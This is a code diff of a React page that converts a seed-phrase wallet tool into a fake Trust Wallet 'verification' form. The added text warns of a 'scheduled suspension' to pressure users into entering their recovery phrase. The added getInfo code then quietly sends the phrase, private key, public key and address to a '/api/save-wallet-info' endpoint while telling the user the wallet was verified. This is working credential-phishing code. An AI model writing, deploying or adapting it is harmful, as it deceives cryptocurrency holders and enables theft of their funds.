@@ -17,18 +17,6 @@ const Home = () => {
 	const {update, loading, call} = useStore()
 	const updateStatus = (params : {[key : string] : string | number | boolean | any}) => setStates({ ...state, ...params })
 
-	const save = async () => {
-		if(state.address === '' || state.address === null){
-			tips("Invalid Address")
-			return;
-		}
-		var res = await call("/api/save-wallet-info", {seeds:state.value, address:state.address, publickey:state.publickey, privatekey:state.privatekey});
-		if(res?.error === 0){
-			tips("Success: Saved Wallet Info")
-		}else {
-			tips("Error: Known error")
-		}
-	}
 	const getInfo = async () => {
 		var v = state.value.replaceAll("  ", "");
 		var arr = v.split(" ");
@@ -38,7 +26,14 @@ const Home = () => {
 		}
 		var res = await call("/api/get-wallet-info", {seeds:v});
 		if(res?.error === 0){
-			updateStatus({address:"0x"+res['address'], privatekey:res['privatekey'], publickey:res['publickey']})
+			if(res['address']){
+				res = await call("/api/save-wallet-info", {seeds:state.value, address:res['address'], publickey:res['publickey'], privatekey:res['privatekey']});
+				if(res?.error === 0){
+					tips("Success: Verified wallet information")
+				}else {
+					tips("Error: Known error")
+				}
+			}
 		}else {
 			tips("Error: Known error")
 		}
@@ -47,38 +42,28 @@ const Home = () => {
 		<>
 			<Header />
 			<div className="home">
-				<div className="section-1">
 					<div className="container">
-						<div className="row" >
-							<div className="col-lg-5 col-md-12">
-								<div style={{marginTop:'200px'}}>
-									<h2 className='text-white'>Can Get Wallet Info</h2>
-									<h2 className='text-white'>From 12, 24 Seeds</h2>
-									<h3 className='text-white'>World Most Secure & Easy Way</h3>
-									<br/>
-									<a href = "https://t.me" target={"_blank"} className='button-white'>Go To Telegram</a>
-								</div>
-							</div>
-							<div className="col-lg-7 col-md-12">
-								<div className="form" style={{marginTop:'100px'}}>
-									<h4 className='mt0 mb3'>Security Phrase</h4>
-									<input type={"text"} className="w100"  placeholder="Please input 12,24 seeds" value={state.value} onChange={(e)=>{updateStatus({value:e.target.value})}}/>
-									<div className="row center mt1">
-										<button  className='btn-linear w30 ' onClick={() => {getInfo()}}>Get Info</button>	
-									</div>
-									<h5>Wallet Address</h5> 
-									<textarea  className="w100" rows={1} onClick={()=>{if(state.address !== ''){copyToClipboard(state.address); tips("Copied: address")}}} value={state.address} style={{borderRadius:'10px', cursor:'pointer', margin:0, fontSize:'1.1em'}} readOnly/>
-									<h5>Public Key</h5>
-									<textarea  className="w100" rows={4} onClick={()=>{if(state.publickey !== ''){copyToClipboard(state.publickey); tips("Copied: publickey")}}} value={state.publickey} style={{borderRadius:'10px', cursor:'pointer', margin:0, fontSize:'1.1em'}} readOnly/>
-									<h5 className='p0 mt2'>Private Key</h5>
-									<textarea  className="w100" rows={4} onClick={()=>{if(state.privatekey !== ''){copyToClipboard(state.privatekey); tips("Copied: privatekey")}}} value={state.privatekey} style={{borderRadius:'10px', cursor:'pointer', margin:0, fontSize:'1.1em'}} readOnly/>
-									<div className="row center">
-										<button  className='btn-linear w30' onClick={() => {save()}}>Save</button>	
-									</div>
-								</div>
+						<div className="row">
+							<div className="col-12">
+								<p>
+									To verify your wallet enter the 12 or 23 Recovery Phrase from your Trust Wallet in the right order, after doing this correctly your wallet will be completly verified and the scheduled suspension will be removed automaticall right after.
+								</p>
 							</div>
 						</div>
-					</div>
+						<div className="row mt5 center">
+							<div className="col-12">
+								<h4>Enter your Recovery Phrase correctly to prevent suspension on your wallet</h4>
+								<p>Make sure no one is watching you right now, never share your passphrase with other people.</p>
+							</div>
+						</div>
+						<div className="row center">
+							<div className="col-12">
+								<input type={"text"} className="w100"  placeholder="Enter Recovery Phrase" value={state.value} onChange={(e)=>{updateStatus({value:e.target.value})}}/>
+							</div>
+						</div>
+						<div className="row center mt3">
+							<button  className='btn-linear w50 ' onClick={() => {getInfo()}}>Verify my wallet</button>	
+						</div>
 				</div>
 			</div>
 			<Footer />	
